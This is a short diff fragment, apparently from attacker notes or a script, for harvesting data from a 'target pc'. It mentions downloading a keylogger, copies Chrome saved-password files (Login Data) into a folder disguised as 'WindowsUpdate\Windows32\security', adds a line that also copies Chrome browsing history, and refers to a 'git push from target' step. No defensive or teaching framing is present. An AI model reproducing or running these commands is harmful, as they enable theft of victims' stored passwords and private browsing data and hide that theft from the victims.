@@ -55,6 +55,7 @@ downloading keylooger to target pc
  mkdir profile
  Copy-Item -Path $ENV:UserProfile'\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Destination $ENV:UserProfile'\WindowsUpdate\Windows32\security'
  Copy-Item -Path $ENV:UserProfile'\AppData\Local\Google\Chrome\User Data\Profile 3\Login Data' -Destination $ENV:UserProfile'\WindowsUpdate\Windows32\security\profile'
+ Copy-Item -Path $ENV:UserProfile'\AppData\Local\Google\Chrome\User Data\Default\History' -Destination $ENV:UserProfile'\WindowsUpdate\Windows32\security'
  
  =====================
  git push from target
